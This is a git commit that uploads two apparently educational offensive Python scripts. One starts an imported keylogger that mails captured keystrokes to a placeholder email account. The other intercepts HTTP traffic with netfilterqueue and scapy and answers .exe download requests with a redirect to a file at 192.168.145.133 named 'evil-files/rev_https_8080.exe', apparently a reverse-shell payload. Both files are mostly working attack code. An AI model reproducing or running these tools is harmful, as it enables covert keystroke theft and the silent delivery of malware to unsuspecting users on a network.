7133a6bbd8c1d69484258f338c232a6bb2b09b11
Arpan-D <96893554+Arpan-D@users.noreply.github.com>
2021-12-30 19:59:52 -0800

    Add files via upload

---
+++ Ace_logger.py
@@ -0,0 +1,8 @@
+#!/usr/bin/env python
+import keylogger
+
+my_keylogger = keylogger.Keylogger(20, "add your email", "add password")
+my_keylogger.start()
+
+
+
---
+++ replace_downloads.py
@@ -0,0 +1,34 @@
+#!/usr/bin/env python
+import netfilterqueue
+import scapy.all as scapy
+
+ack_list = []
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 8080:
+            if ".exe" in scapy_packet[scapy.Raw].load and b"192.168.145.133" not in scapy_packet[scapy.Raw].load:
+                print("[+] exe Request")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+        elif scapy_packet[scapy.TCP].sport == 8080:
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing file")
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.145.133/evil-files/rev_https_8080.exe\n\n")
+
+                packet.set_payload(str(scapy_packet))
+
+    packet.accept()
+
+
+queue = netfilterqueue.Netfilterqueue()
+queue.bind(0, process_packet)
+queue.run()
